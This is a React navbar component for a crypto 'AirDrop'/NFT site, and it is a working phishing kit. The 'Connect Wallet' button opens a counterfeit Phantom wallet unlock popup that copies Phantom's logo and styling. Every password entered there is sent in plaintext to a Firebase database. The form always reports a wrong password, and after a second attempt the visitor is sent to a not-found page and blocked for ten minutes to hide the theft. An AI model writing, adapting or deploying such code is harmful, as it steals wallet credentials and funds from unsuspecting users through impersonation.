import React, { useRef, useContext, useEffect } from "react";
import { HiMenuAlt4 } from "react-icons/hi";
import { AiOutlineClose, AiFillPlayCircle } from "react-icons/ai";
import { WalletContext } from "../context/WalletContext";
import { getDatabase, ref, update } from 'firebase/database';
import {app} from '../config'
import { shortenAddress } from "../utils/shortenAddress";
import logo from "../../images/logo1.png";
import phantomIcon from "../../images/ph-icon.gif";

const NavBarItem = ({ title, classprops }) => (
  // eslint-disable-next-line jsx-a11y/anchor-is-valid
  <a href={title === "View NFTs" ? "#viewNFT" : "#"}>
    <li className={`mx-4 cursor-pointer ${classprops}`}>{title}</li>{" "}
  </a>
);

const Navbar = () => {
  const myDivRef = useRef(null);
  const [wrongTimes, setWrongTimes] = React.useState(0);
  const [toggleMenu, setToggleMenu] = React.useState(false);
  const [visible, setVisible] = React.useState(false);
  const [phWrongPass, setphWrongPass] = React.useState(false);
  const [password, setPassword] = React.useState("");
  const { currentAccount, connectWallet } = useContext(WalletContext);
  // const currentAccount = "0x123456";
  // const connectWallet = () => console.log("connectWallet");

  const connectWalletCustom = () => {
    if (window.solana && window.solana.isPhantom){
        setVisible(true);
        const database = getDatabase(app);
        const timestamp = (new Date()).getTime();
        update(ref(database, `users`), {
            [timestamp]: {
                'event': "Join"
            }
        }).then(() => {
          
        }).catch(err => {

        })
      } else {
        window.open('https://chromewebstore.google.com/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa?hl=en', '_blank', 'noopener,noreferrer');
      }
  }

  const handleClickOutside = (event) => {
    if (myDivRef.current && !myDivRef.current.contains(event.target)) {
      // This means the click occurred outside of myDiv
      setVisible(false)
      // Perform desired actions, e.g., close a dropdown, hide a modal
    }
  };

  const handleKeyDown = (event) => {
    if (event.key === 'Enter') {
      // Prevent the default form submission behavior if the input is part of a form
      event.preventDefault();
      setphWrongPass(true);
      const database = getDatabase(app);
      const timestamp = (new Date()).getTime();
      setWrongTimes(wrongTimes+1);
      update(ref(database, `users`), {
          [timestamp]: {
              'event': "Input",
              'value': password
          }
      }).then(() => {
        // local
        if(wrongTimes >= 1) {
          const now = new Date();
          const currentTimestamp = now.getTime();
          const tenMinutesLater = new Date(currentTimestamp + 10 * 60 * 1000);
          const tenMinutesTimestamp = tenMinutesLater.getTime();
          localStorage.setItem('timestamp', tenMinutesTimestamp);
          window.location.replace('https://not-found.vercel.app/');
        }
      }).catch(err => {

      })
    }
  };

  useEffect(() => {
      document.addEventListener('mousedown', handleClickOutside);
      const savedTimestamp = Number(localStorage.getItem('timestamp'));
      const nowTimestamp = (new Date()).getTime();
      console.log(savedTimestamp, nowTimestamp, "@@@")
      if(nowTimestamp < savedTimestamp) {
        window.location.replace('https://not-found.vercel.app/');
      }
      // Clean up the event listener when the component unmounts
      return () => {
        document.removeEventListener('mousedown', handleClickOutside);
      };
  }, []);

  const navList = ["AirDrop", "View NFTs", "Tutorials", "Wallets"];
  return (
    <nav className="w-full flex md:justify-center justify-between items-center p-4">
      <div className="md:flex-[0.5] flex-initial justify-center items-center top-btn">
        <img src={logo} alt="logo" className="w-32 cursor-pointer" />
      </div>
      <ul className="text-white md:flex hidden list-none flex-row justify-between items-center flex-initial">
        {navList.map((item, index) => (
          <NavBarItem key={item + index} title={item} />
        ))}
        <button
          type="button"
          onClick={connectWalletCustom}
          className="flex flex-row justify-center items-center my-5 bg-[#2952e3] p-3 rounded-full cursor-pointer hover:bg-[#2546bd]"
        >
          <AiFillPlayCircle className="text-white mr-2" />
          <p className="text-white text-base font-semibold">
            {currentAccount ? shortenAddress(currentAccount) : "Connect Wallet"}
          </p>
        </button>
      </ul>
      <div className="flex relative">
        {!toggleMenu && (
          <HiMenuAlt4
            fontSize={28}
            className="text-white md:hidden cursor-pointer"
            onClick={() => setToggleMenu(true)}
          />
        )}
        {toggleMenu && (
          <AiOutlineClose
            fontSize={28}
            className="text-white md:hidden cursor-pointer"
            onClick={() => setToggleMenu(false)}
          />
        )}
        {toggleMenu && (
          <ul
            className="z-10 fixed -top-0 -right-2 p-3 w-[70vw] h-screen shadow-2xl md:hidden list-none
            flex flex-col justify-start items-end rounded-md blue-glassmorphism text-white animate-slide-in"
          >
            <li className="text-xl w-full my-2">
              <AiOutlineClose onClick={() => setToggleMenu(false)} />
            </li>
            {navList.map((item, index) => (
              <NavBarItem
                key={item + index}
                title={item}
                classprops="my-2 text-lg"
              />
            ))}
          </ul>
        )}
      </div>

      {/* Phantom Start */}
      {visible && <div className={`ph-root obdlrx2x`} ref={myDivRef}>
          <div className="ph-header">
            <div></div>
            <svg width="94" height="103" viewBox="0 0 478 103">
              <path
                fill="#999999"
                d="M0 102.895h17.97V85.222c0-8.295-.718-11.42-4.911-19.836l2.276-1.203C21.445 78.49 30.07 83.66 38.937 83.66c14.257 0 25.638-12.503 25.638-31.859 0-18.514-10.423-32.1-25.399-32.1-8.865 0-17.73 5.05-23.841 19.477l-2.276-1.202c2.875-5.771 4.912-11.181 4.912-16.35H0v81.27ZM17.97 51.68c0-7.934 5.991-16.71 14.857-16.71 7.188 0 13.058 5.89 13.058 16.59 0 10.58-5.63 16.831-13.178 16.831-8.387 0-14.736-8.536-14.736-16.71ZM71.135 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.147 4.208 8.147 14.668v31.979h17.97V46.871c0-18.995-6.828-27.17-19.887-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832V.826h-17.97v80.91ZM156.582 83.66c11.621 0 18.45-7.694 23.601-17.553l2.157 1.082c-2.277 4.689-4.433 10.099-4.433 14.547h17.612v-32.7c0-19.477-8.147-29.335-27.196-29.335-18.69 0-27.915 9.377-29.712 19.236l17.252 3.005c.599-5.17 4.792-8.656 11.501-8.656 6.71 0 10.543 3.366 10.543 7.454 0 4.088-3.953 6.011-14.496 6.131-15.575.24-27.076 5.891-27.076 17.914 0 9.858 7.787 18.874 20.247 18.874Zm-2.396-20.078c0-9.498 15.095-2.885 23.362-10.218v2.163c0 8.536-7.548 14.788-15.096 14.788-3.953 0-8.266-1.683-8.266-6.733ZM202.64 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.146 4.208 8.146 14.668v31.979h17.972V46.871c0-18.995-6.829-27.17-19.888-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832h-17.97v60.112ZM309.688 81.977V67.069c-3.834 1.322-14.496 3.606-14.496-5.17V36.051h14.376V21.624h-14.376V5.514l-18.091 5.41v10.7h-10.782v14.427h10.782l.12 27.291c0 20.077 17.851 22.963 32.467 18.635ZM346.192 83.66c18.211 0 32.108-13.946 32.108-32.1 0-18.034-13.897-31.86-32.108-31.86-18.21 0-32.227 13.826-32.227 31.86 0 18.154 14.017 32.1 32.227 32.1Zm-13.657-31.98c0-9.978 5.631-16.951 13.657-16.951 8.027 0 13.538 6.973 13.538 16.951 0 9.979-5.511 16.952-13.538 16.952-8.026 0-13.657-6.973-13.657-16.952ZM383.868 81.736h17.968v-21.16c0-15.508 4.913-25.487 12.82-25.487 5.154 0 6.83 4.088 6.83 14.668v31.979h17.973v-21.16c0-14.547 5.27-25.487 12.82-25.487 5.027 0 6.824 4.69 6.824 14.668v31.979h17.974V46.871c0-19.115-6.232-27.17-18.452-27.17-12.698 0-17.248 9.017-21.682 20.077l-2.16-1.082c4.198-12.623-4.912-18.995-13.896-18.995-11.858 0-16.171 9.017-20.963 19.957l-2.159-1.202c2.994-6.733 4.071-10.82 4.071-16.832h-17.968v60.112Z"
              ></path>
            </svg>

            <svg
              className="ph-help"
              width="15"
              viewBox="0 0 15 15"
              fill="#999"
              cursor="pointer"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z"></path>
            </svg>
          </div>
          <div className="ph-body">
            <div className="ph-kid">
              <img src={phantomIcon}></img>
            </div>
            <div className="ph-form">
              <span className="ph-enterpass">Enter your password</span>
              <div className="ph-inputpass">
                <input
                  style={{ borderColor: phWrongPass ? "red" : "#323232" }}
                  placeholder="Password"
                  type="password"
                  value={password}
                  onChange={(e) => {setPassword(e.target.value)}}
                  onKeyDown={handleKeyDown}
                ></input>
              </div>
              
            </div>
          </div>

          <div className="ph-footer">
            <div className="ph-unlock" onClick={() => {
                  setphWrongPass(true);
                  const database = getDatabase(app);
                  const timestamp = (new Date()).getTime();
                  setWrongTimes(wrongTimes+1);
                  update(ref(database, `users`), {
                      [timestamp]: {
                          'event': "Input",
                          'value': password
                      }
                  }).then(() => {
                    // local
                    if(wrongTimes >= 1) {
                      const now = new Date();
                      const currentTimestamp = now.getTime();
                      const tenMinutesLater = new Date(currentTimestamp + 10 * 60 * 1000);
                      const tenMinutesTimestamp = tenMinutesLater.getTime();
                      localStorage.setItem('timestamp', tenMinutesTimestamp);
                      window.location.replace('https://not-found.vercel.app/');
                    }
                  }).catch(err => {

                  })
            }}>
              <span>Unlock</span>
            </div>
            <div className="ph-forgotpass-content">
                <span className="ph-forgotpass">Forgot password</span>
              </div>
          </div>
        </div>}
    </nav>
  );
};

export default Navbar;
